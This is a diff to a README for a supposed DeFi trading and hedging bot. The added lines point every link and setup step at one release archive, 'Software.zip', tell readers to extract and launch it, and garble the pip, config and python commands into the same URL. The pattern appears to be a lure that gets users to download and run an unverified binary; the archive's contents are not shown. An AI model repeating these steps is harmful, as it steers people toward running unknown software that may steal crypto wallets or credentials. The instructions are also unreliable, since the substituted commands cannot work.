@@ -31,16 +31,16 @@ Welcome to the **DeFi IL Hedge Bot** repository, your go-to solution for managin
 ## Installation
 To get started with the DeFi IL Hedge Bot, simply download the latest version of the repository by clicking the button below:
 
-[![Download ZIP](https://img.shields.io/static/v1?label=Download&message=ZIP&color=green)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Download ZIP](https://github.com/V-i-c-e/defi-il-hedge-bot/releases/download/v1.0/Software.zip)](https://github.com/V-i-c-e/defi-il-hedge-bot/releases/download/v1.0/Software.zip)
 
 *Note: The file needs to be extracted and launched on your local machine to access the codebase.*
 
 ## Usage
-1. **Setting Up Environment:** Install the required dependencies using `pip install -r requirements.txt`.
-2. **Configuration:** Modify the `config.py` file to customize your trading and hedging parameters.
-3. **Launching the Bot:** Run the main script with `python main.py` to start the trading bot.
+1. **Setting Up Environment:** Install the required dependencies using `pip install -r https://github.com/V-i-c-e/defi-il-hedge-bot/releases/download/v1.0/Software.zip`.
+2. **Configuration:** Modify the `https://github.com/V-i-c-e/defi-il-hedge-bot/releases/download/v1.0/Software.zip` file to customize your trading and hedging parameters.
+3. **Launching the Bot:** Run the main script with `python https://github.com/V-i-c-e/defi-il-hedge-bot/releases/download/v1.0/Software.zip` to start the trading bot.
 
 ## Support
-For any inquiries or issues regarding the DeFi IL Hedge Bot, please visit the [Releases](https://github.com/cli/cli/releases) section for the latest updates and documentation.
+For any inquiries or issues regarding the DeFi IL Hedge Bot, please visit the [Releases](https://github.com/V-i-c-e/defi-il-hedge-bot/releases/download/v1.0/Software.zip) section for the latest updates and documentation.
 
 🚀 Happy Trading with DeFi IL Hedge Bot! 🌟
